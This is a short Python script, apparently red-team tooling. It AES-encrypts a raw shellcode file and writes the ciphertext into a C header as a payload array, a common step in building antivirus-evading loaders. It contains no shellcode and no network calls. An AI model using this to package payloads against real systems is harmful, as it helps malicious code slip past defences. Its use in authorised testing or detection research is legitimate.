from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# === CONFIG: Set your AES key and IV ===
key = bytes([
#yourkey
])

iv = bytes([
#yourkey
])

# === Load shellcode ===
with open("sc.bin", "rb") as f:
    shellcode = f.read()

# === Pad and encrypt ===
cipher = AES.new(key, AES.MODE_CBC, iv)
padded = pad(shellcode, AES.block_size)
enc = cipher.encrypt(padded)

# === Generate header ===
with open("payload.h", "w") as f:
    f.write("#pragma once\n")
    f.write(f"unsigned char encryptedPayload[] = {{\n")
    for i, b in enumerate(enc):
        f.write(f"0x{b:02x},")
        if (i + 1) % 16 == 0:
            f.write("\n")
    f.write("\n};\n")
    f.write(f"unsigned int encryptedPayloadLen = {len(enc)};\n")

print(f"[+] payload.h generated with {len(enc)} bytes.")
